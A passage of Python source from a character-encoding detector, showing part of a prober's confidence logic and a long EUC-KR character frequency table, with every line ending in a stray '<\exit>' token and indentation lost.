if self.get_state() == constants.eDetecting:<\exit>
if (self._mContextAnalyzer.got_enough_data() and<\exit>
(self.get_confidence() > constants.SHORTCUT_THRESHOLD)):<\exit>
self._mState = constants.eFoundIt<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
contxtCf = self._mContextAnalyzer.get_confidence()<\exit>
distribCf = self._mDistributionAnalyzer.get_confidence()<\exit>
return max(contxtCf, distribCf)<\exit>
EUCKR_TYPICAL_DISTRIBUTION_RATIO = 6.0<\exit>
EUCKR_TABLE_SIZE = 2352<\exit>
EUCKRCharToFreqOrder = ( \<\exit>
13, 130, 120,1396, 481,1719,1720, 328, 609, 212,1721, 707, 400, 299,1722,  87,<\exit>
1397,1723, 104, 536,1117,1203,1724,1267, 685,1268, 508,1725,1726,1727,1728,1398,<\exit>
1399,1729,1730,1731, 141, 621, 326,1057, 368,1732, 267, 488,  20,1733,1269,1734,<\exit>
945,1400,1735,  47, 904,1270,1736,1737, 773, 248,1738, 409, 313, 786, 429,1739,<\exit>
116, 987, 813,1401, 683,  75,1204, 145,1740,1741,1742,1743,  16, 847, 667, 622,<\exit>
708,1744,1745,1746, 966, 787, 304, 129,1747,  60, 820, 123, 676,1748,1749,1750,<\exit>
1751, 617,1752, 626,1753,1754,1755,1756, 653,1757,1758,1759,1760,1761,1762, 856,<\exit>
344,1763,1764,1765,1766,  89, 401, 418, 806, 905, 848,1767,1768,1769, 946,1205,<\exit>
709,1770,1118,1771, 241,1772,1773,1774,1271,1775, 569,1776, 999,1777,1778,1779,<\exit>
1780, 337, 751,1058,  28, 628, 254,1781, 177, 906, 270, 349, 891,1079,1782,  19,<\exit>
1783, 379,1784, 315,1785, 629, 754,1402, 559,1786, 636, 203,1206,1787, 710, 567,<\exit>
1788, 935, 814,1789,1790,1207, 766, 528,1791,1792,1208,1793,1794,1795,1796,1797,<\exit>
1403,1798,1799, 533,1059,1404,1405,1156,1406, 936, 884,1080,1800, 351,1801,1802,<\exit>
1803,1804,1805, 801,1806,1807,1808,1119,1809,1157, 714, 474,1407,1810, 298, 899,<\exit>
885,1811,1120, 802,1158,1812, 892,1813,1814,1408, 659,1815,1816,1121,1817,1818,<\exit>
1819,1820,1821,1822, 319,1823, 594, 545,1824, 815, 937,1209,1825,1826, 573,1409,<\exit>
1022,1827,1210,1828,1829,1830,1831,1832,1833, 556, 722, 807,1122,1060,1834, 697,<\exit>
1835, 900, 557, 715,1836,1410, 540,1411, 752,1159, 294, 597,1211, 976, 803, 770,<\exit>
1412,1837,1838,  39, 794,1413, 358,1839, 371, 925,1840, 453, 661, 788, 531, 723,<\exit>
544,1023,1081, 869,  91,1841, 392, 430, 790, 602,1414, 677,1082, 457,1415,1416,<\exit>
1842,1843, 475, 327,1024,1417, 795, 121,1844, 733, 403,1418,1845,1846,1847, 300,<\exit>
119, 711,1212, 627,1848,1272, 207,1849,1850, 796,1213, 382,1851, 519,1852,1083,<\exit>
893,1853,1854,1855, 367, 809, 487, 671,1856, 663,1857,1858, 956, 471, 306, 857,<\exit>
1859,1860,1160,1084,1861,1862,1863,1864,1865,1061,1866,1867,1868,1869,1870,1871,<\exit>
282,  96, 574,1872, 502,1085,1873,1214,1874, 907,1875,1876, 827, 977,1419,1420,<\exit>
1421, 268,1877,1422,1878,1879,1880, 308,1881,   2, 537,1882,1883,1215,1884,1885,<\exit>
127, 791,1886,1273,1423,1887,  34, 336, 404, 643,1888, 571, 654, 894, 840,1889,<\exit>
0, 886,1274, 122, 575, 260, 908, 938,1890,1275, 410, 316,1891,1892, 100,1893,<\exit>
1894,1123,  48,1161,1124,1025,1895, 633, 901,1276,1896,1897, 115, 816,1898, 317,<\exit>
1899, 694,1900, 909, 734,1424, 572, 866,1425, 691,  85, 524,1010, 543, 394, 841,<\exit>
1901,1902,1903,1026,1904,1905,1906,1907,1908,1909,  30, 451, 651, 988, 310,1910,<\exit>
1911,1426, 810,1216,  93,1912,1913,1277,1217,1914, 858, 759,  45,  58, 181, 610,<\exit>
269,1915,1916, 131,1062, 551, 443,1000, 821,1427, 957, 895,1086,1917,1918, 375,<\exit>
1919, 359,1920, 687,1921, 822,1922, 293,1923,1924,  40, 662, 118, 692,  29, 939,<\exit>
887, 640, 482, 174,1925,  69,1162, 728,1428, 910,1926,1278,1218,1279, 386, 870,<\exit>
217, 854,1163, 823,1927,1928,1929,1930, 834,1931,  78,1932, 859,1933,1063,1934,<\exit>
1935,1936,1937, 438,1164, 208, 595,1938,1939,1940,1941,1219,1125,1942, 280, 888,<\exit>
1429,1430,1220,1431,1943,1944,1945,1946,1947,1280, 150, 510,1432,1948,1949,1950,<\exit>
1951,1952,1953,1954,1011,1087,1955,1433,1043,1956, 881,1957, 614, 958,1064,1065,<\exit>
1221,1958, 638,1001, 860, 967, 896,1434, 989, 492, 553,1281,1165,1959,1282,1002,<\exit>
1283,1222,1960,1961,1962,1963,  36, 383, 228, 753, 247, 454,1964, 876, 678,1965,<\exit>
1966,1284, 126, 464, 490, 835, 136, 672, 529, 940,1088,1435, 473,1967,1968, 467,<\exit>
50, 390, 227, 587, 279, 378, 598, 792, 968, 240, 151, 160, 849, 882,1126,1285,<\exit>
639,1044, 133, 140, 288, 360, 811, 563,1027, 561, 142, 523,1969,1970,1971,   7,<\exit>
103, 296, 439, 407, 506, 634, 990,1972,1973,1974,1975, 645,1976,1977,1978,1979,<\exit>
1980,1981, 236,1982,1436,1983,1984,1089, 192, 828, 618, 518,1166, 333,1127,1985,<\exit>
818,1223,1986,1987,1988,1989,1990,1991,1992,1993, 342,1128,1286, 746, 842,1994,<\exit>
1995, 560, 223,1287,  98,   8, 189, 650, 978,1288,1996,1437,1997,  17, 345, 250,<\exit>
423, 277, 234, 512, 226,  97, 289,  42, 167,1998, 201,1999,2000, 843, 836, 824,<\exit>
532, 338, 783,1090, 182, 576, 436,1438,1439, 527, 500,2001, 947, 889,2002,2003,<\exit>
2004,2005, 262, 600, 314, 447,2006, 547,2007, 693, 738,1129,2008,  71,1440, 745,<\exit>
619, 688,2009, 829,2010,2011, 147,2012,  33, 948,2013,2014,  74, 224,2015,  61,<\exit>
191, 918, 399, 637,2016,1028,1130, 257, 902,2017,2018,2019,2020,2021,2022,2023,<\exit>
2024,2025,2026, 837,2027,2028,2029,2030, 179, 874, 591,  52, 724, 246,2031,2032,<\exit>
2033,2034,1167, 969,2035,1289, 630, 605, 911,1091,1168,2036,2037,2038,1441, 912,<\exit>
2039, 623,2040,2041, 253,1169,1290,2042,1442, 146, 620, 611, 577, 433,2043,1224,<\exit>
719,1170, 959, 440, 437, 534,  84, 388, 480,1131, 159, 220, 198, 679,2044,1012,<\exit>
819,1066,1443, 113,1225, 194, 318,1003,1029,2045,2046,2047,2048,1067,2049,2050,<\exit>
2051,2052,2053,  59, 913, 112,2054, 632,2055, 455, 144, 739,1291,2056, 273, 681,<\exit>
499,2057, 448,2058,2059, 760,2060,2061, 970, 384, 169, 245,1132,2062,2063, 414,<\exit>
1444,2064,2065,  41, 235,2066, 157, 252, 877, 568, 919, 789, 580,2067, 725,2068,<\exit>
2069,1292,2070,2071,1445,2072,1446,2073,2074,  55, 588,  66,1447, 271,1092,2075,<\exit>
1226,2076, 960,1013, 372,2077,2078,2079,2080,2081,1293,2082,2083,2084,2085, 850,<\exit>
2086,2087,2088,2089,2090, 186,2091,1068, 180,2092,2093,2094, 109,1227, 522, 606,<\exit>
2095, 867,1448,1093, 991,1171, 926, 353,1133,2096, 581,2097,2098,2099,1294,1449,<\exit>
1450,2100, 596,1172,1014,1228,2101,1451,1295,1173,1229,2102,2103,1296,1134,1452,<\exit>
949,1135,2104,2105,1094,1453,1454,1455,2106,1095,2107,2108,2109,2110,2111,2112,<\exit>
2113,2114,2115,2116,2117, 804,2118,2119,1230,1231, 805,1456, 405,1136,2120,2121,<\exit>
2122,2123,2124, 720, 701,1297, 992,1457, 927,1004,2125,2126,2127,2128,2129,2130,<\exit>
22, 417,2131, 303,2132, 385,2133, 971, 520, 513,2134,1174,  73,1096, 231, 274,<\exit>
962,1458, 673,2135,1459,2136, 152,1137,2137,2138,2139,2140,1005,1138,1460,1139,<\exit>
2141,2142,2143,2144,  11, 374, 844,2145, 154,1232,  46,1461,2146, 838, 830, 721,<\exit>
1233, 106,2147,  90, 428, 462, 578, 566,1175, 352,2148,2149, 538,1234, 124,1298,<\exit>
2150,1462, 761, 565,2151, 686,2152, 649,2153,  72, 173,2154, 460, 415,2155,1463,<\exit>
2156,1235, 305,2157,2158,2159,2160,2161,2162, 579,2163,2164,2165,2166,2167, 747,<\exit>
2168,2169,2170,2171,1464, 669,2172,2173,2174,2175,2176,1465,2177,  23, 530, 285,<\exit>
2178, 335, 729,2179, 397,2180,2181,2182,1030,2183,2184, 698,2185,2186, 325,2187,<\exit>
2188, 369,2189, 799,1097,1015, 348,2190,1069, 680,2191, 851,1466,2192,2193,  10,<\exit>
2194, 613, 424,2195, 979, 108, 449, 589,  27, 172,  81,1031,  80, 774, 281, 350,<\exit>
1032, 525, 301, 582,1176,2196, 674,1045,2197,2198,1467, 730, 762,2199,2200,2201,<\exit>
2202,1468,2203, 993,2204,2205, 266,1070, 963,1140,2206,2207,2208, 664,1098, 972,<\exit>
2209,2210,2211,1177,1469,1470, 871,2212,2213,2214,2215,2216,1471,2217,2218,2219,<\exit>
2220,2221,2222,2223,2224,2225,2226,2227,1472,1236,2228,2229,2230,2231,2232,2233,<\exit>
2234,2235,1299,2236,2237, 200,2238, 477, 373,2239,2240, 731, 825, 777,2241,2242,<\exit>
2243, 521, 486, 548,2244,2245,2246,1473,1300,  53, 549, 137, 875,  76, 158,2247,<\exit>
1301,1474, 469, 396,1016, 278, 712,2248, 321, 442, 503, 767, 744, 941,1237,1178,<\exit>
1475,2249,  82, 178,1141,1179, 973,2250,1302,2251, 297,2252,2253, 570,2254,2255,<\exit>
2256,  18, 450, 206,2257, 290, 292,1142,2258, 511, 162,  99, 346, 164, 735,2259,<\exit>
1476,1477,   4, 554, 343, 798,1099,2260,1100,2261,  43, 171,1303, 139, 215,2262,<\exit>
2263, 717, 775,2264,1033, 322, 216,2265, 831,2266, 149,2267,1304,2268,2269, 702,<\exit>
1238, 135, 845, 347, 309,2270, 484,2271, 878, 655, 238,1006,1478,2272,  67,2273,<\exit>
295,2274,2275, 461,2276, 478, 942, 412,2277,1034,2278,2279,2280, 265,2281, 541,<\exit>
2282,2283,2284,2285,2286,  70, 852,1071,2287,2288,2289,2290,  21,  56, 509, 117,<\exit>
432,2291,2292, 331, 980, 552,1101, 148, 284, 105, 393,1180,1239, 755,2293, 187,<\exit>
2294,1046,1479,2295, 340,2296,  63,1047, 230,2297,2298,1305, 763,1306, 101, 800,<\exit>
808, 494,2299,2300,2301, 903,2302,  37,1072,  14,   5,2303,  79, 675,2304, 312,<\exit>
2305,2306,2307,2308,2309,1480,   6,1307,2310,2311,2312,   1, 470,  35,  24, 229,<\exit>
2313, 695, 210,  86, 778,  15, 784, 592, 779,  32,  77, 855, 964,2314, 259,2315,<\exit>
501, 380,2316,2317,  83, 981, 153, 689,1308,1481,1482,1483,2318,2319, 716,1484,<\exit>
2320,2321,2322,2323,2324,2325,1485,2326,2327, 128,  57,  68, 261,1048, 211, 170,<\exit>
1240,  31,2328,  51, 435, 742,2329,2330,2331, 635,2332, 264, 456,2333,2334,2335,<\exit>
425,2336,1486, 143, 507, 263, 943,2337, 363, 920,1487, 256,1488,1102, 243, 601,<\exit>
1489,2338,2339,2340,2341,2342,2343,2344, 861,2345,2346,2347,2348,2349,2350, 395,<\exit>
2351,1490,1491,  62, 535, 166, 225,2352,2353, 668, 419,1241, 138, 604, 928,2354,<\exit>
1181,2355,1492,1493,2356,2357,2358,1143,2359, 696,2360, 387, 307,1309, 682, 476,<\exit>
2361,2362, 332,  12, 222, 156,2363, 232,2364, 641, 276, 656, 517,1494,1495,1035,<\exit>
416, 736,1496,2365,1017, 586,2366,2367,2368,1497,2369, 242,2370,2371,2372,1498,<\exit>
2373, 965, 713,2374,2375,2376,2377, 740, 982,1499, 944,1500,1007,2378,2379,1310,<\exit>
1501,2380,2381,2382, 785, 329,2383,2384,1502,2385,2386,2387, 932,2388,1503,2389,<\exit>
2390,2391,2392,1242,2393,2394,2395,2396,2397, 994, 950,2398,2399,2400,2401,1504,<\exit>
1311,2402,2403,2404,2405,1049, 749,2406,2407, 853, 718,1144,1312,2408,1182,1505,<\exit>
2409,2410, 255, 516, 479, 564, 550, 214,1506,1507,1313, 413, 239, 444, 339,1145,<\exit>
1036,1508,1509,1314,1037,1510,1315,2411,1511,2412,2413,2414, 176, 703, 497, 624,<\exit>
593, 921, 302,2415, 341, 165,1103,1512,2416,1513,2417,2418,2419, 376,2420, 700,<\exit>
2421,2422,2423, 258, 768,1316,2424,1183,2425, 995, 608,2426,2427,2428,2429, 221,<\exit>
2430,2431,2432,2433,2434,2435,2436,2437, 195, 323, 726, 188, 897, 983,1317, 377,<\exit>
644,1050, 879,2438, 452,2439,2440,2441,2442,2443,2444, 914,2445,2446,2447,2448,<\exit>
915, 489,2449,1514,1184,2450,2451, 515,  64, 427, 495,2452, 583,2453, 483, 485,<\exit>
1038, 562, 213,1515, 748, 666,2454,2455,2456,2457, 334,2458, 780, 996,1008, 705,<\exit>
1243,2459,2460,2461,2462,2463, 114,2464, 493,1146, 366, 163,1516, 961,1104,2465,<\exit>
291,2466,1318,1105,2467,1517, 365,2468, 355, 951,1244,2469,1319,2470, 631,2471,<\exit>
2472, 218,1320, 364, 320, 756,1518,1519,1321,1520,1322,2473,2474,2475,2476, 997,<\exit>
2477,2478,2479,2480, 665,1185,2481, 916,1521,2482,2483,2484, 584, 684,2485,2486,<\exit>
797,2487,1051,1186,2488,2489,2490,1522,2491,2492, 370,2493,1039,1187,  65,2494,<\exit>
434, 205, 463,1188,2495, 125, 812, 391, 402, 826, 699, 286, 398, 155, 781, 771,<\exit>
585,2496, 590, 505,1073,2497, 599, 244, 219, 917,1018, 952, 646,1523,2498,1323,<\exit>
2499,2500,  49, 984, 354, 741,2501, 625,2502,1324,2503,1019, 190, 357, 757, 491,<\exit>
95, 782, 868,2504,2505,2506,2507,2508,2509, 134,1524,1074, 422,1525, 898,2510,<\exit>
161,2511,2512,2513,2514, 769,2515,1526,2516,2517, 411,1325,2518, 472,1527,2519,<\exit>
2520,2521,2522,2523,2524, 985,2525,2526,2527,2528,2529,2530, 764,2531,1245,2532,<\exit>
2533,  25, 204, 311,2534, 496,2535,1052,2536,2537,2538,2539,2540,2541,2542, 199,<\exit>
704, 504, 468, 758, 657,1528, 196,  44, 839,1246, 272, 750,2543, 765, 862,2544,<\exit>
2545,1326,2546, 132, 615, 933,2547, 732,2548,2549,2550,1189,1529,2551, 283,1247,<\exit>
1053, 607, 929,2552,2553,2554, 930, 183, 872, 616,1040,1147,2555,1148,1020, 441,<\exit>
249,1075,2556,2557,2558, 466, 743,2559,2560,2561,  92, 514, 426, 420, 526,2562,<\exit>
2563,2564,2565,2566,2567,2568, 185,2569,2570,2571,2572, 776,1530, 658,2573, 362,<\exit>
2574, 361, 922,1076, 793,2575,2576,2577,2578,2579,2580,1531, 251,2581,2582,2583,<\exit>
2584,1532,  54, 612, 237,1327,2585,2586, 275, 408, 647, 111,2587,1533,1106, 465,<\exit>
3, 458,   9,  38,2588, 107, 110, 890, 209,  26, 737, 498,2589,1534,2590, 431,<\exit>
202,  88,1535, 356, 287,1107, 660,1149,2591, 381,1536, 986,1150, 445,1248,1151,<\exit>
974,2592,2593, 846,2594, 446, 953, 184,1249,1250, 727,2595, 923, 193, 883,2596,<\exit>
2597,2598, 102, 324, 539, 817,2599, 421,1041,2600, 832,2601,  94, 175, 197, 406,<\exit>
2602, 459,2603,2604,2605,2606,2607, 330, 555,2608,2609,2610, 706,1108, 389,2611,<\exit>
2612,2613,2614, 233,2615, 833, 558, 931, 954,1251,2616,2617,1537, 546,2618,2619,<\exit>
1009,2620,2621,2622,1538, 690,1328,2623, 955,2624,1539,2625,2626, 772,2627,2628,<\exit>
2629,2630,2631, 924, 648, 863, 603,2632,2633, 934,1540, 864, 865,2634, 642,1042,<\exit>
670,1190,2635,2636,2637,2638, 168,2639, 652, 873, 542,1054,1541,2640,2641,2642,<\exit>
2643,2644,2645,2646,2647,2648,2649,2650,2651,2652,2653,2654,2655,2656,2657,2658,<\exit>
2659,2660,2661,2662,2663,2664,2665,2666,2667,2668,2669,2670,2671,2672,2673,2674,<\exit>
2675,2676,2677,2678,2679,2680,2681,2682,2683,2684,2685,2686,2687,2688,2689,2690,<\exit>
2691,2692,2693,2694,2695,2696,2697,2698,2699,1542, 880,2700,2701,2702,2703,2704,<\exit>
2705,2706,2707,2708,2709,2710,2711,2712,2713,2714,2715,2716,2717,2718,2719,2720,<\exit>
2721,2722,2723,2724,2725,1543,2726,2727,2728,2729,2730,2731,2732,1544,2733,2734,<\exit>
2735,2736,2737,2738,2739,2740,2741,2742,2743,2744,2745,2746,2747,2748,2749,2750,<\exit>
2751,2752,2753,2754,1545,2755,2756,2757,2758,2759,2760,2761,2762,2763,2764,2765,<\exit>
2766,1546,2767,1547,2768,2769,2770,2771,2772,2773,2774,2775,2776,2777,2778,2779,<\exit>
2780,2781,2782,2783,2784,2785,2786,1548,2787,2788,2789,1109,2790,2791,2792,2793,<\exit>
2794,2795,2796,2797,2798,2799,2800,2801,2802,2803,2804,2805,2806,2807,2808,2809,<\exit>
2810,2811,2812,1329,2813,2814,2815,2816,2817,2818,2819,2820,2821,2822,2823,2824,<\exit>
2825,2826,2827,2828,2829,2830,2831,2832,2833,2834,2835,2836,2837,2838,2839,2840,<\exit>
2841,2842,2843,2844,2845,2846,2847,2848,2849,2850,2851,2852,2853,2854,2855,2856,<\exit>
1549,2857,2858,2859,2860,1550,2861,2862,1551,2863,2864,2865,2866,2867,2868,2869,<\exit>
2870,2871,2872,2873,2874,1110,1330,2875,2876,2877,2878,2879,2880,2881,2882,2883,<\exit>
2884,2885,2886,2887,2888,2889,2890,2891,2892,2893,2894,2895,2896,2897,2898,2899,<\exit>
2900,2901,2902,2903,2904,2905,2906,2907,2908,2909,2910,2911,2912,2913,2914,2915,<\exit>
2916,2917,2918,2919,2920,2921,2922,2923,2924,2925,2926,2927,2928,2929,2930,1331,<\exit>
2931,2932,2933,2934,2935,2936,2937,2938,2939,2940,2941,2942,2943,1552,2944,2945,<\exit>
2946,2947,2948,2949,2950,2951,2952,2953,2954,2955,2956,2957,2958,2959,2960,2961,<\exit>
2962,2963,2964,1252,2965,2966,2967,2968,2969,2970,2971,2972,2973,2974,2975,2976,<\exit>
2977,2978,2979,2980,2981,2982,2983,2984,2985,2986,2987,2988,2989,2990,2991,2992,<\exit>
2993,2994,2995,2996,2997,2998,2999,3000,3001,3002,3003,3004,3005,3006,3007,3008,<\exit>
3009,3010,3011,3012,1553,3013,3014,3015,3016,3017,1554,3018,1332,3019,3020,3021,<\exit>
3022,3023,3024,3025,3026,3027,3028,3029,3030,3031,3032,3033,3034,3035,3036,3037,<\exit>
3038,3039,3040,3041,3042,3043,3044,3045,3046,3047,3048,3049,3050,1555,3051,3052,<\exit>
3053,1556,1557,3054,3055,3056,3057,3058,3059,3060,3061,3062,3063,3064,3065,3066,<\exit>
3067,1558,3068,3069,3070,3071,3072,3073,3074,3075,3076,1559,3077,3078,3079,3080,<\exit>
3081,3082,3083,1253,3084,3085,3086,3087,3088,3089,3090,3091,3092,3093,3094,3095,<\exit>
3096,3097,3098,3099,3100,3101,3102,3103,3104,3105,3106,3107,3108,1152,3109,3110,<\exit>
3111,3112,3113,1560,3114,3115,3116,3117,1111,3118,3119,3120,3121,3122,3123,3124,<\exit>
3125,3126,3127,3128,3129,3130,3131,3132,3133,3134,3135,3136,3137,3138,3139,3140,<\exit>
3141,3142,3143,3144,3145,3146,3147,3148,3149,3150,3151,3152,3153,3154,3155,3156,<\exit>
3157,3158,3159,3160,3161,3162,3163,3164,3165,3166,3167,3168,3169,3170,3171,3172,<\exit>
3173,3174,3175,3176,1333,3177,3178,3179,3180,3181,3182,3183,3184,3185,3186,3187,<\exit>
3188,3189,1561,3190,3191,1334,3192,3193,3194,3195,3196,3197,3198,3199,3200,3201,<\exit>
3202,3203,3204,3205,3206,3207,3208,3209,3210,3211,3212,3213,3214,3215,3216,3217,<\exit>
3218,3219,3220,3221,3222,3223,3224,3225,3226,3227,3228,3229,3230,3231,3232,3233,<\exit>
3234,1562,3235,3236,3237,3238,3239,3240,3241,3242,3243,3244,3245,3246,3247,3248,<\exit>
3249,3250,3251,3252,3253,3254,3255,3256,3257,3258,3259,3260,3261,3262,3263,3264,<\exit>
3265,3266,3267,3268,3269,3270,3271,3272,3273,3274,3275,3276,3277,1563,3278,3279,<\exit>
3280,3281,3282,3283,3284,3285,3286,3287,3288,3289,3290,3291,3292,3293,3294,3295,<\exit>
3296,3297,3298,3299,3300,3301,3302,3303,3304,3305,3306,3307,3308,3309,3310,3311,<\exit>
3312,3313,3314,3315,3316,3317,3318,3319,3320,3321,3322,3323,3324,3325,3326,3327,<\exit>
3328,3329,3330,3331,3332,3333,3334,3335,3336,3337,3338,3339,3340,3341,3342,3343,<\exit>
3344,3345,3346,3347,3348,3349,3350,3351,3352,3353,3354,3355,3356,3357,3358,3359,<\exit>
3360,3361,3362,3363,3364,1335,3365,3366,3367,3368,3369,3370,3371,3372,3373,3374,<\exit>
3375,3376,3377,3378,3379,3380,3381,3382,3383,3384,3385,3386,3387,1336,3388,3389,<\exit>
3390,3391,3392,3393,3394,3395,3396,3397,3398,3399,3400,3401,3402,3403,3404,3405,<\exit>
3406,3407,3408,3409,3410,3411,3412,3413,3414,1337,3415,3416,3417,3418,3419,1338,<\exit>
3420,3421,3422,1564,1565,3423,3424,3425,3426,3427,3428,3429,3430,3431,1254,3432,<\exit>
3433,3434,1339,3435,3436,3437,3438,3439,1566,3440,3441,3442,3443,3444,3445,3446,<\exit>
3447,3448,3449,3450,3451,3452,3453,3454,1255,3455,3456,3457,3458,3459,1567,1191,<\exit>
3460,1568,1569,3461,3462,3463,1570,3464,3465,3466,3467,3468,1571,3469,3470,3471,<\exit>
3472,3473,1572,3474,3475,3476,3477,3478,3479,3480,3481,3482,3483,3484,3485,3486,<\exit>
1340,3487,3488,3489,3490,3491,3492,1021,3493,3494,3495,3496,3497,3498,1573,3499,<\exit>
1341,3500,3501,3502,3503,3504,3505,3506,3507,3508,3509,3510,3511,1342,3512,3513,<\exit>
3514,3515,3516,1574,1343,3517,3518,3519,1575,3520,1576,3521,3522,3523,3524,3525,<\exit>
3526,3527,3528,3529,3530,3531,3532,3533,3534,3535,3536,3537,3538,3539,3540,3541,<\exit>
3542,3543,3544,3545,3546,3547,3548,3549,3550,3551,3552,3553,3554,3555,3556,3557,<\exit>
3558,3559,3560,3561,3562,3563,3564,3565,3566,3567,3568,3569,3570,3571,3572,3573,<\exit>
3574,3575,3576,3577,3578,3579,3580,1577,3581,3582,1578,3583,3584,3585,3586,3587,<\exit>
3588,3589,3590,3591,3592,3593,3594,3595,3596,3597,3598,3599,3600,3601,3602,3603,<\exit>
3604,1579,3605,3606,3607,3608,3609,3610,3611,3612,3613,3614,3615,3616,3617,3618,<\exit>
3619,3620,3621,3622,3623,3624,3625,3626,3627,3628,3629,1580,3630,3631,1581,3632,<\exit>
3633,3634,3635,3636,3637,3638,3639,3640,3641,3642,3643,3644,3645,3646,3647,3648,<\exit>
3649,3650,3651,3652,3653,3654,3655,3656,1582,3657,3658,3659,3660,3661,3662,3663,<\exit>
3664,3665,3666,3667,3668,3669,3670,3671,3672,3673,3674,3675,3676,3677,3678,3679,<\exit>
3680,3681,3682,3683,3684,3685,3686,3687,3688,3689,3690,3691,3692,3693,3694,3695,<\exit>
3696,3697,3698,3699,3700,1192,3701,3702,3703,3704,1256,3705,3706,3707,3708,1583,<\exit>
1257,3709,3710,3711,3712,3713,3714,3715,3716,1584,3717,3718,3719,3720,3721,3722,<\exit>
3723,3724,3725,3726,3727,3728,3729,3730,3731,3732,3733,3734,3735,3736,3737,3738,<\exit>
3739,3740,3741,3742,3743,3744,3745,1344,3746,3747,3748,3749,3750,3751,3752,3753,<\exit>
3754,3755,3756,1585,3757,3758,3759,3760,3761,3762,3763,3764,3765,3766,1586,3767,<\exit>
3768,3769,3770,3771,3772,3773,3774,3775,3776,3777,3778,1345,3779,3780,3781,3782,<\exit>
3783,3784,3785,3786,3787,3788,3789,3790,3791,3792,3793,3794,3795,1346,1587,3796,<\exit>
3797,1588,3798,3799,3800,3801,3802,3803,3804,3805,3806,1347,3807,3808,3809,3810,<\exit>
3811,1589,3812,3813,3814,3815,3816,3817,3818,3819,3820,3821,1590,3822,3823,1591,<\exit>
1348,3824,3825,3826,3827,3828,3829,3830,1592,3831,3832,1593,3833,3834,3835,3836,<\exit>
3837,3838,3839,3840,3841,3842,3843,3844,1349,3845,3846,3847,3848,3849,3850,3851,<\exit>
3852,3853,3854,3855,3856,3857,3858,1594,3859,3860,3861,3862,3863,3864,3865,3866,<\exit>
3867,3868,3869,1595,3870,3871,3872,3873,1596,3874,3875,3876,3877,3878,3879,3880,<\exit>
3881,3882,3883,3884,3885,3886,1597,3887,3888,3889,3890,3891,3892,3893,3894,3895,<\exit>
1598,3896,3897,3898,1599,1600,3899,1350,3900,1351,3901,3902,1352,3903,3904,3905,<\exit>
3906,3907,3908,3909,3910,3911,3912,3913,3914,3915,3916,3917,3918,3919,3920,3921,<\exit>
3922,3923,3924,1258,3925,3926,3927,3928,3929,3930,3931,1193,3932,1601,3933,3934,<\exit>
3935,3936,3937,3938,3939,3940,3941,3942,3943,1602,3944,3945,3946,3947,3948,1603,<\exit>
3949,3950,3951,3952,3953,3954,3955,3956,3957,3958,3959,3960,3961,3962,3963,3964,<\exit>
3965,1604,3966,3967,3968,3969,3970,3971,3972,3973,3974,3975,3976,3977,1353,3978,<\exit>
3979,3980,3981,3982,3983,3984,3985,3986,3987,3988,3989,3990,3991,1354,3992,3993,<\exit>
3994,3995,3996,3997,3998,3999,4000,4001,4002,4003,4004,4005,4006,4007,4008,4009,<\exit>
4010,4011,4012,4013,4014,4015,4016,4017,4018,4019,4020,4021,4022,4023,1355,4024,<\exit>
4025,4026,4027,4028,4029,4030,4031,4032,4033,4034,4035,4036,4037,4038,4039,4040,<\exit>
1605,4041,4042,4043,4044,4045,4046,4047,4048,4049,4050,4051,4052,4053,4054,4055,<\exit>
4056,4057,4058,4059,4060,1606,4061,4062,4063,4064,1607,4065,4066,4067,4068,4069,<\exit>
4070,4071,4072,4073,4074,4075,4076,1194,4077,4078,1608,4079,4080,4081,4082,4083,<\exit>
4084,4085,4086,4087,1609,4088,4089,4090,4091,4092,4093,4094,4095,4096,4097,4098,<\exit>
4099,4100,4101,4102,4103,4104,4105,4106,4107,4108,1259,4109,4110,4111,4112,4113,<\exit>
4114,4115,4116,4117,4118,4119,4120,4121,4122,4123,4124,1195,4125,4126,4127,1610,<\exit>
4128,4129,4130,4131,4132,4133,4134,4135,4136,4137,1356,4138,4139,4140,4141,4142,<\exit>
4143,4144,1611,4145,4146,4147,4148,4149,4150,4151,4152,4153,4154,4155,4156,4157,<\exit>
4158,4159,4160,4161,4162,4163,4164,4165,4166,4167,4168,4169,4170,4171,4172,4173,<\exit>
4174,4175,4176,4177,4178,4179,4180,4181,4182,4183,4184,4185,4186,4187,4188,4189,<\exit>
4190,4191,4192,4193,4194,4195,4196,4197,4198,4199,4200,4201,4202,4203,4204,4205,<\exit>
4206,4207,4208,4209,4210,4211,4212,4213,4214,4215,4216,4217,4218,4219,1612,4220,<\exit>
4221,4222,4223,4224,4225,4226,4227,1357,4228,1613,4229,4230,4231,4232,4233,4234,<\exit>
4235,4236,4237,4238,4239,4240,4241,4242,4243,1614,4244,4245,4246,4247,4248,4249,<\exit>
4250,4251,4252,4253,4254,4255,4256,4257,4258,4259,4260,4261,4262,4263,4264,4265,<\exit>
4266,4267,4268,4269,4270,1196,1358,4271,4272,4273,4274,4275,4276,4277,4278,4279,<\exit>
4280,4281,4282,4283,4284,4285,4286,4287,1615,4288,4289,4290,4291,4292,4293,4294,<\exit>
4295,4296,4297,4298,4299,4300,4301,4302,4303,4304,4305,4306,4307,4308,4309,4310,<\exit>
4311,4312,4313,4314,4315,4316,4317,4318,4319,4320,4321,4322,4323,4324,4325,4326,<\exit>
4327,4328,4329,4330,4331,4332,4333,4334,1616,4335,4336,4337,4338,4339,4340,4341,<\exit>
4342,4343,4344,4345,4346,4347,4348,4349,4350,4351,4352,4353,4354,4355,4356,4357,<\exit>
4358,4359,4360,1617,4361,4362,4363,4364,4365,1618,4366,4367,4368,4369,4370,4371,<\exit>
4372,4373,4374,4375,4376,4377,4378,4379,4380,4381,4382,4383,4384,4385,4386,4387,<\exit>
4388,4389,4390,4391,4392,4393,4394,4395,4396,4397,4398,4399,4400,4401,4402,4403,<\exit>
4404,4405,4406,4407,4408,4409,4410,4411,4412,4413,4414,4415,4416,1619,4417,4418,<\exit>
4419,4420,4421,4422,4423,4424,4425,1112,4426,4427,4428,4429,4430,1620,4431,4432,<\exit>
4433,4434,4435,4436,4437,4438,4439,4440,4441,4442,1260,1261,4443,4444,4445,4446,<\exit>
4447,4448,4449,4450,4451,4452,4453,4454,4455,1359,4456,4457,4458,4459,4460,4461,<\exit>
4462,4463,4464,4465,1621,4466,4467,4468,4469,4470,4471,4472,4473,4474,4475,4476,<\exit>
4477,4478,4479,4480,4481,4482,4483,4484,4485,4486,4487,4488,4489,1055,4490,4491,<\exit>
4492,4493,4494,4495,4496,4497,4498,4499,4500,4501,4502,4503,4504,4505,4506,4507,<\exit>
4508,4509,4510,4511,4512,4513,4514,4515,4516,4517,4518,1622,4519,4520,4521,1623,<\exit>
